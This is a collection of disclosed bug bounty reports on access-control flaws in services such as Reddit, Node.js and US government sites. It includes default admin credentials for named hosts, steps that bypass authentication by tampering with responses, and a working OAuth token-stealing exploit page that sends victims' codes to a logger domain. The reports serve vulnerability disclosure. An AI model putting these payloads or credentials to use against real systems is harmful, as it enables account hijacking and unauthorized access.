- **Report ID:** `1667998`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** KAYAK
- **Reporter:** @retr02332
- **Bounty:** - usd
- **Disclosed:** 2023-01-19T16:31:15.244Z
- **CVE(s):** -

**Summary (team):**

We received this great report about a vulnerability in our Android app on August 12. An initial patch was made available via the Google Play Store on August 13 (version 161.2). The vulnerability had been introduced only very recently prior to its discovery and we have no indication that it has been exploited.

**Summary (researcher):**

During my research of zero day vulnerabilities in mobile applications, I found that it is possible to steal a user's session cookie through a malicious deeplink in KAYAK v161.1. Below, I will explain in detail what this vulnerability is, where it is located in the code and what steps need to be taken to replicate the exploit.

* https://fluidattacks.com/blog/account-takeover-kayak/

---

### [Github app Privilege Escalation to Administrator/Owner of the Organization ](https://hackerone.com/reports/1732595)

- **Report ID:** `1732595`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitHub
- **Reporter:** @vaib25vicky
- **Bounty:** - usd
- **Disclosed:** 2023-01-13T14:16:05.663Z
- **CVE(s):** CVE-2022-23741

**Summary (team):**

An incorrect authorization vulnerability was identified in GitHub Enterprise Server that allowed a scoped user-to-server token to escalate to full admin/owner privileges. An attacker would require an account with admin access to install a malicious GitHub App. This vulnerability was fixed in versions 3.3.17, 3.4.12, 3.5.9, and 3.6.5. This vulnerability was reported via the GitHub Bug Bounty program.

---

### [DNS rebinding in --inspect (insufficient fix of CVE-2022-32212 affecting macOS devices)](https://hackerone.com/reports/1714979)

- **Report ID:** `1714979`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @zeyu2001
- **Bounty:** 4200 usd
- **Disclosed:** 2023-01-12T18:08:57.873Z
- **CVE(s):** CVE-2022-32212, CVE-2018-7160

**Vulnerability Information:**

The fix for CVE-2022-32212, covered the cases for routable IP addresses, however, there exists a specific behavior on macOS devices when handling the `http://0.0.0.0` URL that allows an attacker-controlled DNS server to bypass the DNS rebinding protection by resolving hosts in the `.local` domain.

[Original HackerOne report](https://hackerone.com/reports/1632921)

[Node.js Blog](https://nodejs.org/en/blog/vulnerability/september-2022-security-releases/#dns-rebinding-in-inspect-insufficient-fix-of-cve-2022-32212-affecting-macos-devices-high-cve-2022-32212-cve-2018-7160)

## Impact

Attacker with access to a compromised DNS server or the ability to spoof its responses can gain access to the Node.js debugger, which can result in remote code execution.

**Summary (team):**

##DNS rebinding in --inspect (insufficient fix of CVE-2022-32212 affecting macOS devices) (High) (CVE-2022-32212, CVE-2018-7160)

The fix for CVE-2022-32212, covered the cases for routable IP addresses, however, there exists a specific behavior on macOS devices when handling the http://0.0.0.0 URL that allows an attacker-controlled DNS server to bypass the DNS rebinding protection by resolving hosts in the .local domain.

An attacker-controlled DNS server can, resolve <Computer Name>.local to any arbitrary IP address, and consequently cause the victim's browser to load arbitrary content at http://0.0.0.0. This allows the attacker to bypass the DNS rebinding protection.

###Impacts:

All versions of the 18.x, 16.x, and 14.x release lines.

---

### [[MK8DX] Improper verification of Competition creation allows to create "Official" competitions](https://hackerone.com/reports/1653676)

- **Report ID:** `1653676`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nintendo
- **Reporter:** @crazy_man123
- **Bounty:** - usd
- **Disclosed:** 2022-12-15T00:25:32.678Z
- **CVE(s):** -

**Summary (team):**

.

**Summary (researcher):**

# Introduction

This vulnerability impacts:

- Mario Kart 8 Deluxe on the Switch
- Mario Kart 8 on the WiiU

**The vulnerability was fixed for Mario Kart 8 Deluxe the 7 December, 2022 with the release of v2.2 (or v851968 for the internal version)**
**The vulnerability was fixed for Mario Kart 8 the 3 August, 2023 with the release of v4.2 (or v851968 for the internal version)**

**NOTE**: The issue was fixed by removing the "recommended" tournament section

---
&nbsp;

When looking for competitions (tournaments), the game will fetch the recommended/favorites from the game server
It uses an attributes filter to know what competition is "Recommended"

Using the NEX server call [MatchmakeExtensionProtocol::CreateCompetition](https://github.com/kinnay/NintendoClients/wiki/Matchmake-Extension-Protocol-(MK8D)#61-createcompetition), you can create a competition

It takes a SimpleSearchObject (it has an attributes field, a list of unsigned 32-bit integers), passing the correct attributes would make your competition appear under the "Recommended" section (right next to Nintendo official competitions)

### Attribute at index 12 - Official

| Value | Description |
| --- | --- |
| 1 | Not official |
| 2 | Official |

### Attribute at index 13 - Recommended

| Value | Description |
| --- | --- |
| 1 | Not recommended |
| 2 | Recommended |

The server wasn't validating the attribute list

The game was fetching up to 20 official competitions, and only 4 already existed
So a malicious user could use up to 16 rows, for example to show a message to all the players browsing the tournaments

---

### [Admin can create a hidden admin account  which even the owner can not detect and remove and do administrative actions on the application.](https://hackerone.com/reports/1596663)

- **Report ID:** `1596663`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Reddit
- **Reporter:** @41bin
- **Bounty:** - usd
- **Disclosed:** 2022-11-14T04:34:23.023Z
- **CVE(s):** -

**Vulnerability Information:**

ads.reddit.com is an ads creating and managing application for reddit. The application has the feature to invite other members to the organization and give different roles at ad management.
Testing around the role management functionalities, I have noticed that a user with the same email can get invited to the same organization multiple times if the user is assigned with different roles.
So, taking advantage of this behavior I found the admin as an attacker can create an `undetectable/hidden admin account` and do administrative actions on the organization like remove other users and invite other users. Since this malicious account information  can not be seen in the `members` section, even the `owner` of the organization can not detect and remove this malicious user from the organization.

**Steps to reproduce:**
1) Login as admin from https://ads.reddit.com/
```
I know creating an owner account and then creating an admin account with in a limited time is  little-bit painful.
You can use the following credentials to login as admin

        email :██████████
        name: ███████
        password : ██████████
```
2) Go to https://ads.reddit.com/account/███/permissions and invite a user (malicious hidden user) by giving the role as `admin`
3) login to that account (malicious hidden user) from a different browser and accept the invite. 
4) Same as the second step, go to the admin account and invite the same malicious user by giving the role as `Analyst`.
5) Now go to the malicious user account and then go to https://ads.reddit.com/accounts.
6) You will see the new invitation arrived with the `Analyst` role. Accept the invitation.
7) From this account (malicious) go to https://ads.reddit.com/account/████████/billing while intercepting  the requests using burpsuite.
8) Look at the burp history and find out the `Authorization token` used by the account and copy it. (see `copy-the-auth-token.png`)
9) Now go to the normal admin account and change the permission of this malicious account to `None`   (It removes malicious account from the organization) and refresh the page to confirm that the malicious user is removed.
10) Using burpsuite repeater, change the email and send the following request by replacing the token which you copied from the 8'th step.
```
POST /api/v2.0/accounts/█████████/invitations HTTP/2
Host: ads-api.reddit.com
Content-Length: 87
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="102"
Accept: application/json
Content-Type: application/json
Authorization: ██████
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://ads.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ads.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

{"data":{"recipient_email":"█████████","type":"ADMIN"}}

```
11) Now you are able to invite other users to the organization even though you are not a member of that organization.

## Impact

Let me explain the `impact` with different scenarios as an example.

1)
-  The owner invites an admin to the organization and the admin who knows about this issue creates an account in this way.
- Latter, the owner decide to change the role of this admin to `analyst`  or remove this admin from the organization due to some reasons
- Now the `admin as the malicious user`, can do sensitive actions in the organization like inviting or removing other users.
- When the `owner` goes to the `members` section, he will not find the malicious account there and even he `can not remove` that malicious account from the organization.

2)
- It also happens when the owner or admin invites other users accidentally in this way.  
- It is not complicated, the vulnerability arises when a user accepts multiple invitations assigned with different roles from a single organization.

---

### [Accessing/Editing Folders of Other Users in the Orginisation.](https://hackerone.com/reports/1025881)

- **Report ID:** `1025881`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Lark Technologies
- **Reporter:** @imran0x01
- **Bounty:** - usd
- **Disclosed:** 2022-10-29T00:56:53.359Z
- **CVE(s):** -

**Summary (team):**

A vulnerability was found where users without Primary admin privileges were able to view/modify the directory structure of other users in their organization. This would occur after those users were invited to view/modify their folders by a Primary admin. We thank @snapsec for reporting this to our team.

---

### [access nagios dashboard using default credentials in ** omon1.fpki.gov, 3.220.248.203**](https://hackerone.com/reports/1700896)

- **Report ID:** `1700896`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. General Services Administration
- **Reporter:** @ahmed0x0mahmoud
- **Bounty:** - usd
- **Disclosed:** 2022-10-21T23:33:17.272Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
when i performing recon on fpki.gov i found nagios dashboard in ** omon1.fpki.gov, 3.220.248.203**  and i accessed it using default credentials

username:  ** nagiosadmin **
password :  ** nagiosadmin **

## Steps To Reproduce:


  1. visit these urls : 
        **  https://omon1.fpki.gov/nagios/side.php **
        ** https://3.220.248.203/nagios/side.php **
  2. he will ask to put your credentials in basic authentication enter these credentials 
       
         username:  ** nagiosadmin **
         password :  ** nagiosadmin **

##POC:

look at poc pic

## Impact

attacker can make any action like an admin he has full control on your panal.

thanks , have a nice day :)

---

### [Authentication bypass leads to Information Disclosure at  U.S Air Force "https://███"](https://hackerone.com/reports/1690548)

- **Report ID:** `1690548`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @h41th3m
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T17:01:38.866Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Hackerone Triage team,

I'm new in this program, what i understood that every Web Owned/Operated by DoD is in scope , so i did some google searches , exactly in wikipedia and i've find this PNG that confirms that U.S Air Force is in scope : https://en.wikipedia.org/wiki/United_States_Department_of_Defense#/media/File:DoD_Organization_December_2013.jpg


Authentication vulnerabilities are some of the simplest issues to understand. However, they can be among the most critical due to the obvious relationship between authentication and security. As well as potentially allowing attackers direct access to sensitive data and functionality, they also expose additional attack surface for further exploits. 

So While testing AIR Force domain "*.af.mil" , i've find this subdomain `https://███/` that have a Login page , it's look like an Admin things , so i did some pentesting , and it's time to Authentication Bypass , especially because it uses APIs to deal with Database.

## System Host(s)
█████

## Affected Product(s) and Version(s)
U.S Air Force: af.mil

## Steps to Reproduce
#Steps for POC / Exploit :
1.go "https://████/harbor/sign-in" , then username:password as : `admin:admin`
2.Please be aware that we are going to intercept every single request in our Process of exploitation ,
3.Before forwarding the request , using burp actions , use ; 
```
Do intercept : response to this request
```
4.Change the Value of response :

**From**
```
HTTP/1.1 401 Unauthorized
vary: Cookie
x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
date: Sat, 03 Sep 2022 18:42:09 GMT
content-length: 0
x-envoy-upstream-service-time: 1510
server: envoy
connection: close
```
**TO THIS and forwarded it **
```
HTTP/1.1 200 OK
vary: Cookie
x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
date: Sat, 03 Sep 2022 18:42:09 GMT
content-length: 0
x-envoy-upstream-service-time: 1510
server: envoy
connection: close

```
5.Ignore the second request about : `GET /api/v2.0/systeminfo HTTP/1.1` not neccaserry
6.Intercept again and use methods in 3,4:
```
GET /api/v2.0/users/current HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Cache-Control: no-cache
Pragma: no-cache
Connection: close
Referer: https://█████/harbor/sign-in
Cookie: sid=a66e49e995c2fe659086de2237f422c2; _gorilla_csrf=MTY2MjIyOTI3N3xJa05hUkhFeWNGTXhNbU5CUzNwVE1XNU5LM1o0Y2k5WlJWY3ZOVGR1WlZCM2FIRk9jMHBXTUdKc05FVTlJZ289fB0DLyMK59qRUoo_SpL9Sv0QZkyDGLDVGMNa9_UYMSWz
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-FORWARDED-FOR: 127.0.0.1
```
**Change it from*
```
HTTP/1.1 401 Unauthorized
content-type: application/json; charset=utf-8
vary: Cookie, Accept-Encoding
x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
date: Sat, 03 Sep 2022 18:45:12 GMT
x-envoy-upstream-service-time: 3
server: envoy
connection: close
Content-Length: 61

{"errors":[{"code":"UNAUTHORIZED","message":"UnAuthorize"}]}
```

**To**
```
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
vary: Cookie, Accept-Encoding
x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
date: Sat, 03 Sep 2022 18:45:12 GMT
x-envoy-upstream-service-time: 3
server: envoy
connection: close
Content-Length: 61

{"message":"Authorized"}
```

7.Keep intercepting any request and check if response header and body are :

```
HTTP/1.1 401 Unauthorized

{"errors":[{"code":"UNAUTHORIZED","message":"UnAuthorize"}]}

```

to
```
HTTP/1.1 200 OK
{"message":Authorized}
```


**Then BOOM , i was able to enter your data as shown in my ScreenShots , and for sure that when i tap in Profile , i can see UserProfile** 

████████
██████
██████████

#Please be aware that :

I wanted to stop my Hacking Process here , for not damaging or harm or delete any data for the server , so if you want to go further with exploitation to increase the impact or clear you mind that is a valid Bug, please let me know as soon as possible


## Impact

Sensitive Information Disclosure

Results that i've find so far:

```
█████████████████████████
```
Burp ScreenShot :
██████████

---

### [Broken access discloses users and PII at https://███████ [HtUS]](https://hackerone.com/reports/1624374)

- **Report ID:** `1624374`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @g4mb4
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T13:53:44.609Z
- **CVE(s):** -

**Vulnerability Information:**

Good morning,

I was able to register at https://████/ and get the list of users.
1- Go to https://██████████/OA_HTML/ibeCAcpSSOReg.jsp and register.
2- Go to https://███/OA_HTML/AppsLocalLogin.jsp with the created user and login.
3- On the homepage, click on vacations rules, create, and search users.
4- User are disclosed.

██████

Regards,

G4MB4

## Impact

An attacker is able to access users information.

---

### [DNS rebinding in --inspect (insufficient fix of CVE-2022-32212 affecting macOS devices)](https://hackerone.com/reports/1632921)

- **Report ID:** `1632921`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Node.js
- **Reporter:** @zeyu2001
- **Bounty:** - usd
- **Disclosed:** 2022-09-28T08:38:39.547Z
- **CVE(s):** CVE-2022-32212, CVE-2018-7160

**Vulnerability Information:**

**Summary:** This is an insufficient fix of CVE-2022-32212, which itself is a fix of CVE-2018-7160. There exists a specific behaviour in browsers on macOS devices when handling the `http://0.0.0.0`URL that allows an attacker-controlled DNS server to bypass the DNS rebinding protection by resolving hosts in the `.local` domain.

**Description:** 

In the latest version, only IP addresses and `localhost` are allowed in the `Host` header when connecting to the debugger endpoint. `IsIPAddress` ensures that IPv4 address octets only contain values ranging from 0 to 255, but this allows `0.0.0.0` [which indicates an invalid or unroutable target](https://en.wikipedia.org/wiki/0.0.0.0). 

In macOS devices, using `fetch("http://0.0.0.0")`or opening `http://0.0.0.0` through a top-level navigation in Chrome and Firefox will cause a DNS request to resolve `<Computer Name>.local`, where Computer Name is configured in the system preferences (the use of the `.local` TLD is a known [feature](https://blog.scottlowe.org/2006/01/04/mac-os-x-and-local-domains) of macOS devices). If such a request succeeds, `http://0.0.0.0` is routed to the IP address provided in the DNS reply. This would typically be the same as the IP address of the device on the local network, so `http://0.0.0.0` will typically route to any application listening on the local interface - working as intended.

An attacker-controlled DNS server can, however, resolve `<Computer Name>.local` to any arbitrary IP address, and consequently cause the victim's browser to load arbitrary content at `http://0.0.0.0`. This allows the attacker to bypass the DNS rebinding protection.

Note: On Windows devices, `http://0.0.0.0` is treated as an invalid URL and the request is blocked.

## Steps To Reproduce:

### General Attack Flow

1. Victim runs node with --inspect option
2. Victim visits attacker's webpage
3. The attacker's webpage opens `http://0.0.0.0:9229`
4. Victim asks the DNS server for `<Computer Name>.local` and gets <attacker's-IP>.
5. Victim loads webpage `http://0.0.0.0:9229` from <attacker's-IP>.
6. The webpage `http://0.0.0.0:9229` tries to load `http://0.0.0.0:9229/json`.
7. Due to a short TTL, the DNS server will be soon asked again about an entry for `<Computer Name>.local`. This time, the DNS server responds with "127.0.0.1".
8. The `http://0.0.0.0:9229` website (i.e., the one hosted on <attacker's IP>) will retrieve `http://0.0.0.0:9229/json` from 127.0.0.1, including webSocketDebuggerUrl.
9. Now, the attacker knows the webSocketDebuggerUrl and can connect to it using WebSocket. Note that WebSocket is not restricted by same-origin policy. By doing so, they can gain the privileges of the Node.js instance.

Vulnerable code segment: https://github.com/nodejs/node/blob/d9b71f4c241fa31cc2a48331a4fc28c15937875a/src/inspector_socket.cc#L164-L183

### DNS Setup

In this example I used [dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html) as my DNS server. You can use {F1816108} for a minimal Docker setup that demonstrates the arbitrary resolution of `<Computer Name>.local` domains. The `hosts` file should be changed according to the configured Computer Name of the victim device (through system preferences). For example, my Computer Name is `Zeyu’s MacBook Pro`, which means I had the `Zeyus-Macbook-Pro.local` domain.

```
# Resolve <Computer Name>.local to any IP address
1.1.1.1 Zeyus-Macbook-Pro.local
```

When connecting to `http://0.0.0.0`, the page is loaded from `1.1.1.1` instead.

{F1816116}

If you observe the network traffic while connecting to `http://0.0.0.0`, you should see the relevant DNS requests and replies.

{F1816134}

Subsequently `<Computer Name>.local` can be rebinded to `127.0.0.1`, causing the page to be loaded from `127.0.0.1` where the debugger is listening.

{F1816125}

## Suggested Remediation

[According to IANA](https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml), `0.0.0.0/8` is a reserved address range. To prevent this vulnerability, this address range could be blocked.

A way to check for this address range could simply be `accum == 0` in the first octet or `host.front() == '0'` in [IsIPAddress](https://github.com/nodejs/node/blob/d9b71f4c241fa31cc2a48331a4fc28c15937875a/src/inspector_socket.cc#L164-L183)

## Supporting Material/References:

- Original vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2018-7160
- Code segment: https://github.com/nodejs/node/blob/d9b71f4c241fa31cc2a48331a4fc28c15937875a/src/inspector_socket.cc#L164-L183

## Impact

Attacker with access to a compromised DNS server or the ability to spoof its responses can gain access to the Node.js debugger, which can result in remote code execution.

---

### [Unprotected ██████ and Test site API Exposes Documents, Credentials, and Emails in ██████████ Proposal System](https://hackerone.com/reports/745171)

- **Report ID:** `745171`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @byteone
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T20:40:56.354Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The test/integration API of the █████ web services is publicly exposed: disclosing documents, emails, and credentials to what appears to be the Seaport Bid proposal system. Because I did not attempt any exploitation outside of that necessary to deem this a reportable issue, it is not clear if the data is only test generated or if the system contains production documents, credentials, etc. 

███████

**Description:**
While performing manual reconnaissance, I came across Swagger/API documentation for the ███ web services API at https://███████/. 

The API endpoint appears to have four main types of functionality:

1) Document storage/retrieval
2) Email template storage
3) Email generation
4) PDF generation

Due to the lack of authentication on the API, the system can be easily abused by a minimally sophisticated attacker.

## Impact & Steps to Reproduce

1) Documents stored in the system can be uploaded, modified, or deleted via the API. Per the DoD program rules on data exfil, I did not try to access the documents. You can view a listing of the documents here:

https://███/api/1_0/Documents

2) Email templates can be access and modified. For example, you can view all email templates here:

https://██████████/api/1_0/EmailTemplates

You can also add, modify, or delete templates via the API.

3) Most importantly, you can view all of the emails that the system has sent via the API. The exact route is:

https://████/api/1_0/EmailMessages

**The emails are highly sensitive because they contain the activation codes needed to create a new account and access the █████████ Proposal System at https://███/Bid/.** 

For example, one of the last emails sent includes the following:

```

{"resultmetadata":[{"emailId":"3f6f7fb7-167b-432d-b35b-f443709ba832","systemcode":null,"senderEmailAddress":"████ Admin<DoNotReply@█████.com>","acknowledgementRequested":false,"attachments":[],"tags":[],"tokens":null,"emailStatus":"Sent","Subject":"Your ███████ Authentication Code","Body":"Your authentication code is 373A51. This code will expire at 09:23 AM on 11/22/2019.\r\n\r\n-----------------------------------------------------------------\r\n\r\nYou may check in through the following link https://████/Bid.\r\n\r\nThank you for your business with ███████.\r\n\r\nPlease do not reply directly to this message. 

```

Note the █████ Authentication Code `373A51`, which would allow an attacker to login to the system at https://█████/Bid.

The emails also include usernames of current users in the system who will have access expiring in the near future:

█████
You can view the full list of emails here:

https://█████████/api/1_0/EmailMessages

## Suggested Mitigation/Remediation Actions

Utilize bearer token authentication on the API route so that unauthorized parties cannot query it. Alternatively, lock down access to the API endpoint to restricted IP addresses or networks so that it is no longer publicly accessible.

## Impact

* Upload, delete, or download sensitive files stored in the document DB
* Send, read, and modify emails from ████ admin 
* Login to ████ proposal system using stolen authentication codes sent to users

---

### [Default Login Credentials on https://broadbandmaps.mtn.com.gh/ ](https://hackerone.com/reports/1297480)

- **Report ID:** `1297480`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** MTN Group
- **Reporter:** @theranger
- **Bounty:** - usd
- **Disclosed:** 2022-08-25T11:05:03.033Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello Team,
I just found out that `broadbandmaps.mtn.com.gh` requires logging in when you visit it, but it turned out that you can actually login as an Admin and do anything on the specific site.
when you visit the mentioned site you will get this   
{F1405776}
it will require to be logged in to perform any action, to bypass this you have to Login with the default credentials `Username`= admin `password`= admin , and for some reasons you can't login with Firefox it only works on Google chrome and  chromium web browser.

## Supporting Material:
-Check this Video >
{F1405806}

## Impact

Access admin Panel due to Default credentials

---

### [IDOR allowing to read another user's token on the Social Media Ads service](https://hackerone.com/reports/1464168)

- **Report ID:** `1464168`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2022-08-16T07:47:23.980Z
- **CVE(s):** -

**Summary (team):**

The hotfix was released asap. The investigation showed that there were no cases of vulnerability exploitation.

**Summary (researcher):**

Social Media Ads is a tool for dedicated paid social specialists working with ads. The tool needs to interact with the user's social network account. To do this, Semrush collects a token to access and modify the advertising data of the social media account. There was a possible ability to brute force ids due to weak id generation by MongoDB. As a result, it was possible to access another user's token. MongoDB Object Ids have the following pattern:
- а 4-byte timestamp, representing the ObjectId's creation, measured in seconds since the Unix epoch.
- а 5-byte random value generated once per process. This random value is unique to the machine and process.
- а 3-byte incrementing counter, initialized to a random value.

---

### [One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com](https://hackerone.com/reports/1567186)

- **Report ID:** `1567186`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Reddit
- **Reporter:** @fransrosen
- **Bounty:** - usd
- **Disclosed:** 2022-08-02T15:13:53.849Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

# Description

I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.

The way it works is this:

1. Attacker prepares a `state`-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.
2. Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with `www.redditmedia.com`, which is an intentional sandbox but with a fun quirk, it uses `window.name` of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.
3. The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the `state`-value that the attacker set. Also, the `response_type` is modified from `code` to `code+id_token` and the `response_mode` to `fragment`. This is the second important part why we can steal the code, since Reddit uses `response_mode=web_message` live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. **Reddit is not expecting to get any sensitive tokens in the URL fragment.** Also, the `redirect_uri` set in the OAuth-application in Apple for Reddit is allowing `https://reddit.com` only as the return page. This is something you need to remove, or point elsewhere. When you're using `response_mode=web_message`, the `redirect_uri` doesn't really matter what it is set to, since the whole origin of `https://reddit.com` will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.
4. Victim clicks the link from the attacker page, will go through "sign-in with Apple" for Reddit, but with the attacker's `state`-parameter. When the login process is completed, the URL of the main page becomes `https://reddit.com/#state=xxx&code=xxx&access_token=xx`.
5. The XSS on `www.redditmedia.com` in the first window, which has the same domain as the iframe, will be allowed to ask about the `window.name` of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.

Here's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:

{F1726830}

And here's a link for testing:

```
https://fransrosen.com/reddit-hijack-424342.html
```

# Technical details

Here's the HTML of the malicious page:

```html
<html>
<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
<body>
<div id="start">
Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
<input id="state">
<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
</div>


<div id="fr"></div>

<script>
var inj, monitor;
function extractstate(st) {
    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
}
function startmonitor(st) {
    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
    monitor = setInterval(function() {
        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
            if (e.length) {
                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
                var p = document.createElement('pre');
                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
                document.getElementById('fr').appendChild(p)
                clearInterval(monitor);
            }
        });
    }, 2000);
}
function launch(st, showonly) {
    if (showonly) {
        history.pushState('/','/',location.pathname + '?state=' + st)
        document.getElementById('fr').innerText = 'Send this link to victim: ';
        var p = document.createElement('pre');
        p.innerText = location.href;
        document.getElementById('fr').appendChild(p);
        startmonitor(st);
    } else {
        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
    }
    document.getElementById('start').innerHTML = '';
}
if (location.search && location.search.split('state=')[1].split('&')[0]) {
    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
}
window.onmessage = function(e) {
    if (e.data === 'stopinject') {
        console.log('frame injected');
        clearInterval(inj)
    }
    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
        payload = JSON.parse(e.data);
        data = payload.hash.replace('state=state=', 'state=');
        var state = data.split('state=')[1].split('&')[0];
        var code = data.split('code=')[1].split('&')[0];
        var id_token = data.split('id_token=')[1].split('&')[0];
        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});

        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
        var p = document.createElement('pre');
        p.innerText = payload;
        document.getElementById('fr').appendChild(p);

        var s = document.createElement('img');
        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
        document.body.appendChild(s);   
    }
}

</script>


</body>
</html>
```

What this page will do is:

1. Ask the attacker to prepare the `state`-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.

{F1726829}

{F1726831}

2. Load the `https://www.redditmedia.com` with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.
3. The GTM-script will load, it looks like this:

```html
<script>var b, x;
var state = parent.location.href.substr(location.href.indexOf('state='));
var d = document.createElement('div');
if (!window.inited) {
  window.inited = true;
d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
parent.document.children[parent.document.children.length - 1].appendChild(d);
if(top!==parent.window) top.postMessage('stopinject', '*');
parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
x = setInterval(function() {
if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
  clearInterval(x);
};

}, 500);
}
</script>
```

4. This javascript will render the "Click here"-link:

{F1726833}

